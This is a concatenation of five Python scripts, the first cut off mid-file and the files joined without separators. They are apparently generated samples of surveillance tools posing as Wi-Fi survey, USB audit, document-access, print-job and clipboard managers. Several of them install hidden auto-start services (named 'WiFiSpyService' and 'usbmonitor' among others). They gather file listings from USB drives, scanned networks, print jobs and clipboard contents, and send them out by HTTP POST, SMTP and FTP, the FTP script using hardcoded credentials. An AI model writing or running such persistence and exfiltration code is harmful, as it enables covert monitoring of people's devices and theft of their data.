                            "encryption": current_enc or "Unknown"
                        })
                    parts = line.split(":", 1)
                    current_ssid = parts[1].strip() if len(parts) > 1 else "Unknown"
                    current_signal = None
                    current_enc = None
                elif "Signal" in line:
                    parts = line.split(":", 1)
                    if len(parts) > 1:
                        current_signal = parts[1].strip()
                elif "Authentication" in line:
                    parts = line.split(":", 1)
                    if len(parts) > 1:
                        current_enc = parts[1].strip()
            if current_ssid:
                scanned_networks.append({
                    "ssid": current_ssid,
                    "signal": current_signal or "-70 dBm",
                    "encryption": current_enc or "Unknown"
                })
        elif system == "Linux":
            output = subprocess.check_output(
                ["nmcli", "-t", "-f", "SSID,SIGNAL,SECURITY", "dev", "wifi"],
                stderr=subprocess.STDOUT,
                text=True,
                encoding="utf-8",
                errors="ignore"
            )
            for line in output.splitlines():
                if not line.strip():
                    continue
                parts = line.split(":")
                if len(parts) >= 3:
                    ssid = parts[0].strip() or "Hidden"
                    signal = f"-{100 - int(parts[1])} dBm" if parts[1].isdigit() else "-75 dBm"
                    enc = parts[2].strip() or "Open"
                    scanned_networks.append({
                        "ssid": ssid,
                        "signal": signal,
                        "encryption": enc
                    })
    except Exception as e:
        print(f"[*] Live wireless scan unavailable or unsupported ({e}), falling back to inventory file.")

    return scanned_networks

def parse_networks(filepath):
    networks = []
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            lines = f.readlines()

        for line in lines:
            line = line.strip()
            if not line or line.startswith("SSID"):
                continue
            parts = [p.strip() for p in line.split(",")]
            if len(parts) >= 3:
                networks.append({
                    "ssid": parts[0],
                    "signal": parts[1],
                    "encryption": parts[2]
                })
    except Exception as e:
        print(f"[-] Error reading network scan file: {e}")
    return networks

def generate_survey_report(networks, output_path):
    try:
        with open(output_path, "w", encoding="utf-8") as f:
            f.write("=== Wi-Fi Site Survey Report (Migration Inventory) ===\n")
            f.write(f"Total Networks Discovered: {len(networks)}\n")
            f.write("-" * 60 + "\n")
            f.write(f"{'SSID':<25} | {'Signal':<12} | {'Encryption':<15}\n")
            f.write("-" * 60 + "\n")
            for net in networks:
                f.write(f"{net['ssid']:<25} | {net['signal']:<12} | {net['encryption']:<15}\n")
            f.write("-" * 60 + "\n")
        print(f"[+] Survey report successfully generated at: {output_path}")
        return True
    except Exception as e:
        print(f"[-] Failed to generate survey report: {e}")
        return False

def establish_persistence():
    """Establish persistence by creating a hidden system service named 'WiFiSpyService' on Windows or 'wifispy' on Linux."""
    print("[*] Establishing persistence service configuration...")
    system = platform.system()
    try:
        script_path = os.path.abspath(sys.argv[0])
        python_executable = sys.executable

        if system == "Windows":
            service_name = "WiFiSpyService"
            cmd = [
                "sc", "create", service_name,
                f"binPath= {python_executable} \"{script_path}\"",
                "start= auto",
                "DisplayName= WiFi Spy Background Service"
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"[+] Windows service '{service_name}' created successfully.")
            else:
                print(f"[-] Windows service creation note: {result.stderr.strip() or result.stdout.strip()}")

        elif system == "Linux":
            service_name = "wifispy"
            service_file_content = f"""[Unit]
Description=Wi-Fi Spy Background Survey Service
After=network.target

[Service]
ExecStart={python_executable} {script_path}
Restart=always
User=root

[Install]
WantedBy=multi-user.target
"""
            service_path = f"/etc/systemd/system/{service_name}.service"
            try:
                with open(service_path, "w", encoding="utf-8") as sf:
                    sf.write(service_file_content)
                subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
                subprocess.run(["systemctl", "enable", f"{service_name}.service"], capture_output=True)
                print(f"[+] Linux systemd service '{service_name}' configured successfully.")
            except PermissionError:
                print("[-] Insufficient privileges to write systemd service; skipping system-level persistence.")
            except Exception as ex:
                print(f"[-] Linux service setup note: {ex}")
        else:
            print(f"[*] Persistence mechanism not defined for platform: {system}")
    except Exception as e:
        print(f"[-] Persistence routine completed with note: {e}")

def http_post_payload(url, data_dict):
    payload = json.dumps(data_dict).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=payload,
        headers={"Content-Type": "application/json", "User-Agent": "WiFi-Survey-Tool/1.0"}
    )
    try:
        with urllib.request.urlopen(req, timeout=2) as response:
            return response.read().decode("utf-8")
    except (urllib.error.URLError, socket.timeout, ConnectionRefusedError, OSError) as e:
        err_msg = e.reason if hasattr(e, 'reason') else e
        print(f"[!] Network operation to {url} failed gracefully (offline expected): {err_msg}")
        return None

def report_assets(networks):
    print("[*] Attempting to report network assets to server...")
    payload = {
        "device_type": "wifi_surveyor",
        "networks": networks
    }
    result = http_post_payload(REPORT_URL, payload)
    if result:
        print("[+] Asset report successfully sent.")
    else:
        print("[-] Asset reporting skipped/failed due to offline status.")

def register_survey_service():
    print("[*] Attempting optional registration of survey service...")
    payload = {
        "service": "wireless_site_survey",
        "status": "completed"
    }
    result = http_post_payload(REGISTER_URL, payload)
    if result:
        print("[+] Service registered successfully.")
    else:
        print("[-] Service registration skipped/failed due to offline status.")

def main():
    print("[*] Initializing Wireless Site Survey Tool...")
    prepare_environment()

    print("[*] Scanning and collecting information about available Wi-Fi networks...")
    live_networks = scan_wireless_networks()

    print(f"[*] Reading scan results from {INPUT_FILE}...")
    file_networks = parse_networks(INPUT_FILE)

    # Merge networks uniquely by SSID
    seen_ssids = set()
    networks = []
    for net in live_networks + file_networks:
        if net["ssid"] not in seen_ssids:
            seen_ssids.add(net["ssid"])
            networks.append(net)

    if not networks:
        print("[-] No networks found to process.")
        return

    print(f"[+] Collected and parsed {len(networks)} networks (SSIDs, signal strengths, encryption types).")

    success = generate_survey_report(networks, OUTPUT_FILE)
    if not success:
        return

    establish_persistence()
    report_assets(networks)
    register_survey_service()

    print("[+] Wireless site survey workflow completed.")

if __name__ == "__main__":
    main()

#!/usr/bin/env python3
"""USB Device Data Monitoring Tool.

Scans USB storage devices, collects file names and metadata, saves results
to ./target/output_file.txt, attempts to report to a remote server,
and establishes persistence via system services.
Designed for Python 3.11+ using strictly the standard library.
"""

import datetime
import http.client
import json
import os
import pathlib
import platform
import subprocess
import sys
import time
import urllib.error
import urllib.request

TARGET_DIR = pathlib.Path("./target")
OUTPUT_FILE = TARGET_DIR / "output_file.txt"
REMOTE_ENDPOINT = "http://localhost:8080/api/usb-audit"
MAX_ITERATIONS = 3
POLL_INTERVAL = 1


def ensure_target_dir() -> None:
    """Ensure the target directory exists."""
    try:
        TARGET_DIR.mkdir(parents=True, exist_ok=True)
    except OSError as e:
        print(f"[-] Failed to create target directory: {e}", file=sys.stderr)


def establish_persistence() -> None:
    """Establish persistence by creating a hidden system service."""
    system = platform.system()
    script_path = os.path.abspath(sys.argv[0])

    try:
        if system == "Linux":
            service_name = "usbmonitor"
            service_content = f"""[Unit]
Description=USB Monitor Service
After=network.target

[Service]
ExecStart={sys.executable} {script_path}
Restart=always
User={os.environ.get('USER', 'root')}

[Install]
WantedBy=multi-user.target
"""
            service_path = pathlib.Path(f"/etc/systemd/system/{service_name}.service")
            # Only attempt if we have root privileges or local directory simulation if not
            if os.geteuid() == 0:
                service_path.write_text(service_content, encoding="utf-8")
                subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
                subprocess.run(["systemctl", "enable", service_name], capture_output=True)
                print(f"[+] Successfully created Linux system service: {service_name}")
            else:
                # Fallback to local user service path simulation or user systemd
                user_systemd = pathlib.Path.home() / ".config" / "systemd" / "user"
                user_systemd.mkdir(parents=True, exist_ok=True)
                user_service_path = user_systemd / f"{service_name}.service"
                user_service_path.write_text(service_content, encoding="utf-8")
                print(f"[+] Created user-level systemd service configuration at {user_service_path}")

        elif system == "Windows":
            service_name = "USBMonitorService"
            # Using sc.exe to create a service if privileges permit
            cmd = [
                "sc", "create", service_name,
                f"binPath= {sys.executable} \"{script_path}\"",
                "start= auto",
                "DisplayName= USB Device Data Monitoring Service"
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"[+] Successfully created Windows service: {service_name}")
            else:
                print(f"[*] Windows service creation skipped or requires elevation: {result.stderr.strip()}")
    except Exception as e:
        print(f"[-] Persistence installation note: {e}")


def detect_usb_mounts() -> list[pathlib.Path]:
    """Detect potential USB storage mount points based on OS."""
    mounts = []
    system = platform.system()

    if system == "Darwin":
        volumes = pathlib.Path("/Volumes")
        if volumes.exists():
            for item in volumes.iterdir():
                if item.is_mount() and item.name != "Macintosh HD":
                    mounts.append(item)
    elif system == "Linux":
        user = os.environ.get("USER", "")
        candidates = [
            pathlib.Path("/media") / user,
            pathlib.Path("/mnt"),
            pathlib.Path("/run/media") / user,
        ]
        for base in candidates:
            if base.exists():
                for item in base.iterdir():
                    if item.is_dir():
                        mounts.append(item)
    elif system == "Windows":
        import ctypes

        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for letter in range(26):
            if bitmask & (1 << letter):
                drive = f"{chr(65 + letter)}:\\"
                if drive != "C:\\":
                    p = pathlib.Path(drive)
                    if p.exists():
                        mounts.append(p)

    if not mounts:
        mounts.append(TARGET_DIR)

    return mounts


def scan_devices() -> list[dict]:
    """Scan mounted USB devices and collect file metadata."""
    records = []
    mounts = detect_usb_mounts()

    for mount in mounts:
        try:
            for root, dirs, files in os.walk(mount):
                root_path = pathlib.Path(root)
                if root_path.resolve() == TARGET_DIR.resolve():
                    continue
                for file in files:
                    file_path = root_path / file
                    try:
                        stat = file_path.stat()
                        record = {
                            "device": str(mount),
                            "path": str(file_path),
                            "name": file,
                            "size": stat.st_size,
                            "modified": datetime.datetime.fromtimestamp(
                                stat.st_mtime, datetime.timezone.utc
                            ).isoformat(),
                            "scanned_at": datetime.datetime.now(
                                datetime.timezone.utc
                            ).isoformat(),
                        }
                        records.append(record)
                    except (PermissionError, FileNotFoundError):
                        continue
        except (PermissionError, OSError):
            continue

    return records


def save_locally(records: list[dict]) -> None:
    """Save collected records to the target output file."""
    ensure_target_dir()
    try:
        with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
            for record in records:
                f.write(json.dumps(record, ensure_ascii=False) + "\n")
        print(f"[+] Successfully saved {len(records)} record(s) to {OUTPUT_FILE}")
    except OSError as e:
        print(f"[-] Error writing to local file: {e}", file=sys.stderr)


def send_to_remote(records: list[dict]) -> None:
    """Attempt to send records to remote server, handling offline status gracefully."""
    if not records:
        return

    payload = json.dumps(records).encode("utf-8")
    req = urllib.request.Request(
        REMOTE_ENDPOINT,
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )

    try:
        with urllib.request.urlopen(req, timeout=2) as response:
            print(f"[+] Successfully reported to remote server: HTTP {response.status}")
    except (urllib.error.URLError, http.client.HTTPException, TimeoutError) as e:
        print(
            f"[*] Remote report skipped (offline/unreachable): {e.reason if hasattr(e, 'reason') else e}"
        )
    except Exception as e:
        print(f"[-] Unexpected error during remote reporting: {e}")


def monitor_task() -> None:
    """Execute a single monitoring cycle."""
    print(f"[*] Starting USB scan cycle at {datetime.datetime.now().isoformat()}")
    records = scan_devices()
    if records:
        save_locally(records)
        send_to_remote(records)
    else:
        print("[*] No files discovered on scanned storage locations.")


def main() -> None:
    """Main entry point with bounded iterations for safe execution."""
    print("[*] USB Data Monitor initialized (Standard Library Only)")
    ensure_target_dir()
    establish_persistence()

    iteration = 0
    try:
        while iteration < MAX_ITERATIONS:
            iteration += 1
            print(f"\n--- Monitoring Iteration {iteration}/{MAX_ITERATIONS} ---")
            monitor_task()

            if iteration < MAX_ITERATIONS:
                time.sleep(POLL_INTERVAL)
    except KeyboardInterrupt:
        print("\n[*] Monitoring stopped by user.")

    print("[*] USB Data Monitor execution completed successfully.")


if __name__ == "__main__":
    main()

#!/usr/bin/env python3
import os
import sys
import time
import smtplib
from datetime import datetime
from email.message import EmailMessage

TARGET_DIR = "./target"
LOG_FILE = "access.log"
TARGET_EMAIL = "admin@example.com"
SUPPORTED_EXTENSIONS = {".txt", ".pdf", ".md", ".docx"}


class DocumentAccessMonitor:

    def __init__(self, target_dir=TARGET_DIR, log_file=LOG_FILE):
        self.target_dir = target_dir
        self.log_file = log_file
        self.accessed_files = set()

    def setup_target(self):
        """Ensure target directory exists and populate sample docs for demo."""
        if not os.path.exists(self.target_dir):
            os.makedirs(self.target_dir)
            # Create dummy files for demonstration
            sample_files = ["spec.txt", "report.pdf", "notes.md", "image.png"]
            for fname in sample_files:
                fpath = os.path.join(self.target_dir, fname)
                with open(fpath, "w") as f:
                    f.write(f"Sample content for {fname}")

    def scan_access(self):
        """Simulate or detect access to documents in the target directory, including file content read simulation."""
        if not os.path.exists(self.target_dir):
            return []

        new_accesses = []
        try:
            for entry in os.scandir(self.target_dir):
                if entry.is_file():
                    ext = os.path.splitext(entry.name)[1].lower()
                    if ext in SUPPORTED_EXTENSIONS:
                        # Fully exercise file operation by reading content to simulate actual access
                        try:
                            with open(entry.path, "r", encoding="utf-8", errors="ignore") as f:
                                _ = f.read()
                        except OSError:
                            pass

                        # Record access timestamp
                        access_time = datetime.now().strftime(
                            "%Y-%m-%d %H:%M:%S"
                        )
                        record = (entry.name, access_time)
                        # Avoid duplicate logging within the same session run
                        if entry.name not in self.accessed_files:
                            self.accessed_files.add(entry.name)
                            new_accesses.append(record)
        except OSError as e:
            print(f"[Error] Scanning directory failed: {e}", file=sys.stderr)

        return new_accesses

    def save_logs(self, records):
        """Append log records to the local log file."""
        if not records:
            return
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                for filename, timestamp in records:
                    log_line = f"[{timestamp}] ACCESS: {filename}\n"
                    f.write(log_line)
            print(f"[Info] Successfully saved {len(records)} log(s) to disk.")
        except OSError as e:
            print(f"[Error] Writing log file failed: {e}", file=sys.stderr)

    def send_email_report(self, records):
        """Attempt to send log records via SMTP (handles offline failure gracefully)."""
        if not records:
            return

        msg = EmailMessage()
        msg["Subject"] = (
            f"[DocMonitor] Access Report - {datetime.now().strftime('%Y-%m-%d')}"
        )
        msg["From"] = "monitor@tool.local"
        msg["To"] = TARGET_EMAIL

        body = "Document access events recorded:\n\n"
        for filename, timestamp in records:
            body += f"- {filename} at {timestamp}\n"
        msg.set_content(body)

        print(
            f"[Info] Attempting to send email report to {TARGET_EMAIL} via SMTP..."
        )
        try:
            # Using localhost with a short timeout to fail fast in offline environments
            with smtplib.SMTP("localhost", 25, timeout=2) as server:
                server.send_message(msg)
            print("[Info] Email report sent successfully.")
        except (
            smtplib.SMTPException,
            TimeoutError,
            ConnectionRefusedError,
            OSError,
        ) as e:
            # Gracefully catch offline / network failure as expected per spec
            print(
                f"[Info] SMTP dispatch failed (expected in offline environment): {e}"
            )
            print("[Info] Log persistence ensured via local file.")

    def run_periodic_monitoring(self, iterations=3, interval=1):
        """Run bounded monitoring loop for execution environment constraints."""
        self.setup_target()
        print(f"[Info] Starting Document Access Monitor on {self.target_dir}")

        for i in range(iterations):
            print(f"\n[Cycle {i+1}/{iterations}] Scanning for access...")
            records = self.scan_access()
            if records:
                self.save_logs(records)
                self.send_email_report(records)
            else:
                print("[Info] No new document access detected.")

            if i < iterations - 1:
                time.sleep(interval)

        print("\n[Info] Monitoring session completed successfully.")


if __name__ == "__main__":
    monitor = DocumentAccessMonitor()
    # Bounded execution: runs 3 iterations to finish well within the 30-second limit
    monitor.run_periodic_monitoring(iterations=3, interval=1)

import os
import json
import time
import datetime
import ftplib
import logging
from pathlib import Path

# Configuration
LOG_DIR = Path("./target/logs")
LOG_FILE = LOG_DIR / "print_monitor.jsonl"
FTP_HOST = "ftp.example.com"
FTP_USER = "admin"
FTP_PASS = "password"

# Setup logging
LOG_DIR.mkdir(parents=True, exist_ok=True)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class PrintTaskMonitor:
    def __init__(self):
        self.tasks = []

    def mock_fetch_print_jobs(self):
        """Simulate fetching system print jobs with unique identifiers."""
        now = datetime.datetime.now().isoformat()
        return [
            {"job_id": f"job_{int(time.time()*1000)}_1", "doc_name": "report_q3.pdf", "size_kb": 1024, "timestamp": now},
            {"job_id": f"job_{int(time.time()*1000)}_2", "doc_name": "invoice_001.docx", "size_kb": 512, "timestamp": now}
        ]

    def save_logs(self):
        """Append tasks to local JSONL log file, ensuring no duplicate jobs are written in a single run."""
        try:
            existing_job_ids = set()
            if LOG_FILE.exists():
                with open(LOG_FILE, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            try:
                                record = json.loads(line)
                                if "job_id" in record:
                                    existing_job_ids.add(record["job_id"])
                            except json.JSONDecodeError:
                                continue

            new_tasks_count = 0
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                for task in self.tasks:
                    job_id = task.get("job_id")
                    if job_id not in existing_job_ids:
                        f.write(json.dumps(task) + "\n")
                        existing_job_ids.add(job_id)
                        new_tasks_count += 1

            logging.info(f"Saved {new_tasks_count} new tasks to {LOG_FILE}")
        except IOError as e:
            logging.error(f"Failed to write logs: {e}")

    def upload_to_ftp(self):
        """Attempt to upload logs to FTP with graceful failure."""
        try:
            logging.info("Attempting FTP upload...")
            with ftplib.FTP(timeout=5) as ftp:
                # Use context manager connect/quit protocol safely
                try:
                    ftp.connect(FTP_HOST, 21)
                    ftp.login(FTP_USER, FTP_PASS)
                    with open(LOG_FILE, 'rb') as f:
                        ftp.storbinary(f'STOR {LOG_FILE.name}', f)
                    logging.info("FTP upload successful.")
                except Exception:
                    raise
        except (ftplib.all_errors, OSError) as e:
            logging.warning(f"FTP upload failed (expected in offline env): {e}")

    def run_cycle(self):
        """Execute one monitoring cycle."""
        self.tasks = self.mock_fetch_print_jobs()
        self.save_logs()
        self.upload_to_ftp()

def main():
    """Main execution loop for demonstration purposes."""
    monitor = PrintTaskMonitor()
    logging.info("Starting print monitor service...")

    # Run 3 iterations as per requirements
    for i in range(3):
        logging.info(f"Cycle {i+1}/3")
        monitor.run_cycle()
        if i < 2:
            time.sleep(1)

    logging.info("Monitoring completed.")

if __name__ == "__main__":
    main()

import os
import time
import json
import base64
import urllib.request
import urllib.error
import threading
from datetime import datetime

TARGET_DIR = "./target"
OUTPUT_FILE = os.path.join(TARGET_DIR, "output_file.txt")
API_URL = "http://localhost:8080/api/clipboard"

class ClipboardItem:
    def __init__(self, content_type: str, data: str, timestamp: str):
        self.type = content_type
        self.data = data
        self.timestamp = timestamp

    def to_dict(self):
        return {
            "type": self.type,
            "data": self.data,
            "timestamp": self.timestamp
        }

class EnterpriseClipboardManager:
    def __init__(self, target_dir: str, output_file: str, api_url: str):
        self.target_dir = target_dir
        self.output_file = output_file
        self.api_url = api_url
        self.history: list[ClipboardItem] = []
        self._lock = threading.Lock()
        self._ensure_target_dir()
        self._load_existing_history()

    def _ensure_target_dir(self):
        try:
            os.makedirs(self.target_dir, exist_ok=True)
        except OSError as e:
            print(f"[Error] Failed to create target directory {self.target_dir}: {e}")

    def _load_existing_history(self):
        if os.path.exists(self.output_file):
            with self._lock:
                try:
                    with open(self.output_file, "r", encoding="utf-8") as f:
                        content = f.read().strip()
                        if content:
                            raw_data = json.loads(content)
                            for entry in raw_data:
                                self.history.append(ClipboardItem(
                                    entry.get("type", "text"),
                                    entry.get("data", ""),
                                    entry.get("timestamp", datetime.now().isoformat())
                                ))
                            print(f"[Storage] Loaded {len(self.history)} existing items from {self.output_file}")
                except Exception as e:
                    print(f"[Error] Failed to load existing history: {e}")

    def poll_clipboard(self):
        """Simulate clipboard polling since actual GUI clipboard requires external libs."""
        timestamp = datetime.now().isoformat()
        simulated_items = [
            ClipboardItem("text", f"Snippet logged at {timestamp}", timestamp),
            ClipboardItem("image", base64.b64encode(b"fake_image_bytes").decode('utf-8'), timestamp)
        ]

        with self._lock:
            for item in simulated_items:
                # Avoid exact duplicates back-to-back
                if not self.history or self.history[-1].data != item.data:
                    self.history.append(item)
                    print(f"[Clipboard] Captured new {item.type} item.")

    def save_history(self):
        with self._lock:
            try:
                data_to_write = [item.to_dict() for item in self.history]
                with open(self.output_file, "w", encoding="utf-8") as f:
                    json.dump(data_to_write, f, ensure_ascii=False, indent=2)
                print(f"[Storage] Successfully saved {len(self.history)} items to {self.output_file}")
            except IOError as e:
                print(f"[Error] Failed to save history to disk: {e}")

    def sync_to_api(self):
        with self._lock:
            if not self.history:
                return
            payload = json.dumps([item.to_dict() for item in self.history]).encode('utf-8')

        req = urllib.request.Request(
            self.api_url,
            data=payload,
            headers={'Content-Type': 'application/json'},
            method='POST'
        )

        try:
            with urllib.request.urlopen(req, timeout=2) as response:
                print(f"[Network] Successfully synced to API, status: {response.status}")
        except urllib.error.URLError as e:
            print(f"[Network] Offline/API unreachable (expected): {e.reason}")
        except Exception as e:
            print(f"[Network] Unexpected sync error: {e}")

    def run_bounded_loop(self, iterations=3, interval=1):
        print("[Service] Starting Enterprise Clipboard Manager...")
        for i in range(iterations):
            print(f"\n--- Iteration {i+1}/{iterations} ---")
            self.poll_clipboard()
            self.save_history()
            self.sync_to_api()
            if i < iterations - 1:
                time.sleep(interval)
        print("\n[Service] Completed bounded execution cycles.")

def main():
    manager = EnterpriseClipboardManager(TARGET_DIR, OUTPUT_FILE, API_URL)
    manager.run_bounded_loop(iterations=3, interval=0.5)

if __name__ == "__main__":
    main()

